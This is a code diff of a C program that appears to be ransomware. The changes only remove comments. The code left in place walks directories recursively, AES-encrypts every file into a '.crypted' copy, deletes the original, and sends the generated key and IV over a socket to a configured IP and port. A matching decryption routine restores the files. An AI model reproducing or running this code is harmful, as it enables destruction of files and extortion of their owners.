@@ -9,7 +9,7 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
-#include <time.h> //to calculate elapsed time
+#include <time.h>
 
 #define IP "127.0.0.1"
 #define PORT 8888
@@ -169,41 +169,39 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
 
     while ((entry = readdir(directory)) != NULL) {
 
-        char *file = entry->d_name; //stock the name of the file
+        char *file = entry->d_name;
 
         if (entry->d_type == DT_DIR && strcmp(file, ".") != 0 &&
-            strcmp(file, "..") != 0) { //know if it's a directory and ignore the '.' and '..'
+            strcmp(file, "..") != 0) {
 
             unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
 
             char *buffer_directory = (char *) malloc(lenght * sizeof(char));
 
             if (buffer_directory != NULL) {
-                snprintf(buffer_directory, lenght, "%s/%s", path, file); //stock filepath in the buffer
+                snprintf(buffer_directory, lenght, "%s/%s", path, file);
 
                 crypted_list_dir(buffer_directory, key, iv);
 
                 free(buffer_directory);
             }
         } else if ((strcmp(file, ".")) != 0 && (strcmp(file, "..") != 0) && (strstr(file, ".crypted") == 0)) {
-            //printf("Path file : %s/%s\n", path, file); //uncomment to see the path of the file
+
 
             unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
 
-            char *buffer_start = (char *) malloc(lenght * sizeof(char)); //buffer for the initial file
+            char *buffer_start = (char *) malloc(lenght * sizeof(char));
             char *buffer_crypted = (char *) malloc(
-                    (lenght + 8) * sizeof(char)); //buffer for the crypted version of the initial file
+                    (lenght + 8) * sizeof(char));
 
-            if (buffer_start == NULL) { //check if the memory is allocated
+            if (buffer_start == NULL) {
                 printf("Can't allocate the memory !\n");
             } else if (buffer_start != NULL) {
-                snprintf(buffer_start, lenght, "%s/%s", path, file); //stock filepath
+                snprintf(buffer_start, lenght, "%s/%s", path, file);
 
-                if (buffer_start == NULL) { //check if there is a filepath
+                if (buffer_start == NULL) {
                     printf("No filepath\n");
                 }
-
-                //printf("Opening : %s\n", buffer_start); //uncomment to see if the file is going to be open
 
                 long int res = findSize(buffer_start);
 
@@ -211,15 +209,15 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
                     printf("Skipping '%s' - size : %ld bytes\n",file, res);
                     free(buffer_start);
                     free(buffer_crypted);
-                    continue; //skip the function and continue
+                    continue;
                     }
 
-                file_start = fopen(buffer_start, "r"); //open the file in reading mode only
+                file_start = fopen(buffer_start, "r");
 
                 snprintf(buffer_crypted, lenght + 10, "%s/%s.crypted", path,
-                         file); //stock the filepath that we want to create for copying the started file
+                         file);
 
-                file_crypted = fopen(buffer_crypted, "w+"); //open file in write mode
+                file_crypted = fopen(buffer_crypted, "w+");
 
                 if (file_start == NULL) {
                     printf("Can't open file : %s\n", buffer_start);
@@ -231,18 +229,17 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
                     int read_file_len_start;
 
                     while ((read_file_len_start = fread(text_in_file, sizeof(unsigned char), 1024, file_start)) !=
-                           0) { //while there is something in the file
+                           0) {
 
                         int file_crypted_len = encrypt(text_in_file, read_file_len_start, key, iv,
                                                        crypted_text_in_file);
                         fwrite(crypted_text_in_file, sizeof(unsigned char), file_crypted_len, file_crypted);
-                        //printf("Crypted ! -> %s\n", buffer_crypted); //uncomment to see if the file was crypted
                         remove(buffer_start);
                     }
                 }
 
-                fclose(file_start); //close file because we don't need it anymore
-                fclose(file_crypted); //close file because we don't need it anymore
+                fclose(file_start);
+                fclose(file_crypted);
             }
 
             free(buffer_start);
@@ -250,7 +247,7 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
         }
     }
 
-    closedir(directory); //close directory
+    closedir(directory);
 
     socket_msg(key, iv);
 
@@ -267,52 +264,48 @@ void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv)
 
     while ((entry = readdir(directory)) != NULL) {
 
-        char *file = entry->d_name; //stock the name of the file
+        char *file = entry->d_name;
 
         if (entry->d_type == DT_DIR && strcmp(file, ".") != 0 && strcmp(file, "..") != 0 &&
-            strstr(file, ".crypted") == NULL) { //know if it's a directory and ignore the '.' and '..'
+            strstr(file, ".crypted") == NULL) {
 
             unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
 
             char *buffer_directory = (char *) malloc(lenght * sizeof(char));
 
             if (buffer_directory != NULL) {
-                snprintf(buffer_directory, lenght, "%s/%s", path, file); //stock filepath in the buffer
+                snprintf(buffer_directory, lenght, "%s/%s", path, file);
 
                 decrypted_list_dir(buffer_directory, (unsigned char *) key, (unsigned char *) iv);
 
                 free(buffer_directory);
             }
         } else if ((strcmp(file, ".") != 0) && (strcmp(file, "..") != 0) && (strstr(file, ".crypted") != NULL)) {
-            //printf("Path file : %s/%s\n", path, file); //uncomment to see the path of the file
-
             unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
 
             char *buffer_crypted = (char *) malloc(
-                    (lenght) * sizeof(char)); //buffer for the crypted version of the initial file
+                    (lenght) * sizeof(char));
 
-            if (buffer_crypted == NULL) { //check if the memory is allocated
+            if (buffer_crypted == NULL) {
                 printf("Can't allocate the memory !\n");
             } else if (buffer_crypted != NULL) {
-                snprintf(buffer_crypted, lenght, "%s/%s", path, file); //stock filepath
+                snprintf(buffer_crypted, lenght, "%s/%s", path, file);
 
-                if (buffer_crypted == NULL) { //check if there is a filepath
+                if (buffer_crypted == NULL) {
                     printf("No filepath\n");
                 }
 
-                //printf("Opening : %s\n", buffer_crypted); //uncomment to see if the file is going to open
-
-                file_crypted = fopen(buffer_crypted, "r"); //open the file in reading mode only
+                file_crypted = fopen(buffer_crypted, "r");
 
                 unsigned long int new_file_lenght = (lenght - 8) * (sizeof(char));
 
-                char file_new[new_file_lenght]; //array for the path of the final file
+                char file_new[new_file_lenght];
 
                 memcpy(file_new, buffer_crypted, new_file_lenght - 1);
 
                 file_new[new_file_lenght - 1] = '\0';
 
-                file_decrypted = fopen(file_new, "w+"); //open file in write mode
+                file_decrypted = fopen(file_new, "w+");
 
                 if (file_crypted == NULL) {
                     printf("Can't open file : %s\n", buffer_crypted);
@@ -324,26 +317,25 @@ void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv)
                     int read_file_len_crypted;
 
                     while ((read_file_len_crypted = fread(crypted_text_in_file, sizeof(unsigned char), 1040,
-                                                          file_crypted)) != 0) { //while there is something in the file
+                                                          file_crypted)) != 0) {
 
                         int file_decrypted_len = decrypt(crypted_text_in_file, read_file_len_crypted, key, iv,
                                                          decrypted_text_in_file);
                         fwrite(decrypted_text_in_file, sizeof(unsigned char), file_decrypted_len, file_decrypted);
-                        //printf("Decrypted ! -> %s\n", file_new); //uncomment to see if file was decrypted
                         remove(buffer_crypted);
                     }
 
                 }
 
-                fclose(file_crypted); //close file because we don't need it anymore
-                fclose(file_decrypted); //close the file because we don't need it anymore
+                fclose(file_crypted);
+                fclose(file_decrypted);
 
             }
             free(buffer_crypted);
         }
     }
 
-    closedir(directory); //close directory
+    closedir(directory);
 
     printf("--------------------------------------------------------\n");
     printf("Directory : %s......done!\n", path);
@@ -352,8 +344,6 @@ void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv)
 int main(int argc, char *argv[]) {
     clock_t t;
     t = clock();
-
-    //printf("%d arguments \n", argc - 1); //uncomment to see number of arguments
 
     if (argc == 1) {
         ascii_menu();
@@ -391,8 +381,8 @@ int main(int argc, char *argv[]) {
 
         char *key_hex, *iv_hex;
 
-        RAND_bytes(key_bytes, KEY_SIZE); //randomize the key
-        RAND_bytes(iv_bytes, IV_SIZE); //randomize the iv
+        RAND_bytes(key_bytes, KEY_SIZE);
+        RAND_bytes(iv_bytes, IV_SIZE);
 
         key_hex = byteTOhex(key_bytes, KEY_SIZE);
         iv_hex = byteTOhex(iv_bytes, IV_SIZE);
